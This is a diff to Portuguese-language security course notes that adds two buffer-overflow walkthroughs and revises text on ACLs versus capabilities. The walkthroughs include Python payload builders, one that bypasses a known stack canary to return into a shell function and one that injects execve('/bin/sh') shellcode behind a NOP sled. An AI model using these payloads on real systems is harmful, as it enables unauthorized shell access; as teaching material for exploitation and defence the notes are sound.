@@ -60,11 +60,101 @@ Ao usar remendos e trampolins, é possível modificar o comportamento de um prog
 ### ACL's x Capability's
 
 ### BufferOverflow + Canary + Endereço de Retorno
-1. Canary : on
-2. ASLR: off
-3. NX: on
+Para explorar um Buffer Overflow nesse cenário e fazer com que a função que acessa a shell seja executada, mesmo com o NX (No-eXecute) e o canário de pilha habilitados, você pode seguir os seguintes passos:
+
+#### 1. **Entendimento do cenário**:
+- **NX** (No-eXecute): impede que o conteúdo da pilha seja executado, ou seja, você não pode injetar código shellcode diretamente na pilha.
+- **Canário**: um valor que é inserido na pilha antes do endereço de retorno, projetado para detectar e prevenir sobre-escritas de pilha. Se o canário for modificado, o programa detecta e aborta a execução.
+- **ASLR** (Address Space Layout Randomization) desativado: significa que os endereços de memória são previsíveis, o que facilita a exploração.
+- **Localização da função shell** conhecida: você sabe onde está a função que acessa a shell na memória.
+
+#### 2. **Estratégia de exploração**:
+
+Como o ASLR está desativado, você pode fazer um **Ret2Libc** ou **Return Oriented Programming (ROP)** para redirecionar o fluxo de execução para a função da shell.
+
+- **Canário**: como você conhece o valor do canário, pode sobrescrevê-lo corretamente para evitar que o programa detecte o ataque.
+- **NX habilitado**: você não pode executar código injetado na pilha, então precisa redirecionar o fluxo de execução para uma função já existente.
+
+#### 3. **Passos práticos**:
+
+1. **Preencher o Buffer**: 
+  - A variável `char buff[0x30]` tem 48 bytes. Então, você precisa enviar 48 bytes para preencher o buffer até alcançar o canário.
+
+2. **Sobrescrever o Canário**:
+  - Após os 48 bytes do buffer, você deve colocar o valor correto do canário para não ser detectado.
+
+3. **Sobrescrever o Endereço de Retorno**:
+  - Após o canário, você deve colocar os bytes necessários para pular a base pointer (`saved EBP`) e então sobrescrever o endereço de retorno.
+  - Como você conhece o endereço da função que acessa a shell, coloque o endereço dessa função como o novo endereço de retorno.
+
+#### 4. **Estrutura do Payload**:
+
+Aqui está como seria a estrutura do payload:
+
+```
+[48 bytes de dados arbitrários] + [valor do canário] + [dados para pular o saved EBP] + [endereço da função shell]
+```
+
+# Exemplo de como construir o payload
+```python
+payload = b"A" * 48                # Preenche o buffer com 48 bytes arbitrários
+payload += b"\xef\xbe\xad\xde"     # Valor do canário em little-endian (0xdeadbeef)
+payload += b"B" * 4                # Pula o saved EBP
+payload += b"\x84\x84\x04\x08"     # Endereço da função shell em little-endian (0x08048484)
+
+# Exibir o payload
+print(payload)
+```
 
 ### Como fazer e utilizar um Shellcode em que você tem o endereço da variável char buff[64] (NX: Off, Canary: Off, ASLR: Off)
+Quando o NX, Canary e ASLR estão desativados, você pode explorar a vulnerabilidade de Buffer Overflow de maneira mais direta, injetando um shellcode diretamente na pilha para abrir um terminal. Aqui está um exemplo de como você pode fazer isso em Python.
+
+#### 1. **Shellcode**:
+O shellcode é um pequeno pedaço de código que será executado. Neste caso, usaremos um shellcode que abre um terminal (`/bin/sh`). Um exemplo de shellcode para sistemas Linux é:
+
+```python
+shellcode = (
+    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+)
+```
+
+Esse shellcode corresponde a um código que invoca `execve("/bin/sh", NULL, NULL)`.
+
+#### 2. **Buffer Overflow Exploit**:
+
+Como você conhece o endereço da variável `char buff[64]`, você pode preencher o buffer com o shellcode e depois sobrescrever o endereço de retorno com o endereço do início do buffer.
+
+#### 3. **Explicação**:
+
+- **NOP sled**: Uma sequência de instruções `NOP` (`\x90`), que não fazem nada. Isso aumenta a chance de cair no shellcode.
+- **Shellcode**: O código que será executado para abrir o terminal.
+- **Sobrescrever o endereço de retorno**: Você substitui o endereço de retorno na pilha com o endereço do buffer onde o shellcode foi injetado. Quando a função retorna, a execução continua no shellcode.
+
+#### 4. **Exemplo Completo**:
+
+```python
+import struct
+
+# Shellcode para abrir /bin/sh
+shellcode = (
+    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+    b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+)
+
+# Endereço conhecido da variável buff[64]
+buff_address = 0xffffd5f0  # Exemplo fictício, substitua pelo endereço real
+
+# Preencher o buffer com NOPs, shellcode e depois o endereço de retorno
+padding = b"\x90" * (64 - len(shellcode))  # NOP sled
+payload = padding + shellcode  # Inserir o shellcode no buffer
+payload += struct.pack("<I", buff_address)  # Sobrescrever o endereço de retorno com o endereço do buffer
+
+# Exibir o payload em formato que pode ser usado para exploração
+print(payload)
+```
+
+Isso gerará um payload que pode ser passado para o programa vulnerável. Quando o programa retorna, ele executará o shellcode, abrindo um terminal.
 
 
 # Vulnerabilidade e Ataque em Sistemas
@@ -229,9 +319,9 @@ A imagem compara duas formas de controlar o acesso a recursos em sistemas comput
 - **Auditoria**: As ACLs facilitam a auditoria do sistema, pois permitem verificar diretamente quem tem permissão para acessar um determinado objeto.
 
 #### Capacidades (Capabilities ou Clists):
-- **Representação**: Em vez de serem associadas a objetos, as capacidades são atribuídas a processos. Uma capacidade é um token ou referência que dá a um processo a permissão de acessar um objeto específico.
-- **Funcionamento**: Um processo que possui uma capacidade pode acessar o recurso diretamente sem que o sistema precise verificar uma ACL associada ao objeto.
-- **Independência do usuário**: As capacidades podem ser atribuídas a processos sem relação direta com o usuário, permitindo um controle mais fino sobre permissões, como nos casos de fork (criação de processos filhos), menor privilégio (least privilege), e delegação de permissões.
+- **Representação**: Em vez de serem associadas a objetos, as capacidades são atribuídas a um sujeito. Uma capacidade é um token ou referência que dá a um sujeito a permissão de acessar um objeto específico.
+- **Funcionamento**: Um sujeito que possui uma capacidade pode acessar o recurso diretamente sem que o sistema precise verificar uma ACL associada ao objeto.
+- **Independência do usuário**: As capacidades podem ser atribuídas a sujeito sem relação direta com o usuário, permitindo um controle mais fino sobre permissões, como nos casos de fork (criação de processos filhos), menor privilégio (least privilege), e delegação de permissões.
 
 ### Anti Vírus
 Software utilizado para prevenir, detectar e remover malwares. Não são perfeitos. Podem agir através de **assinatura** e **Heurísticas e Aprendizado de máquina**:
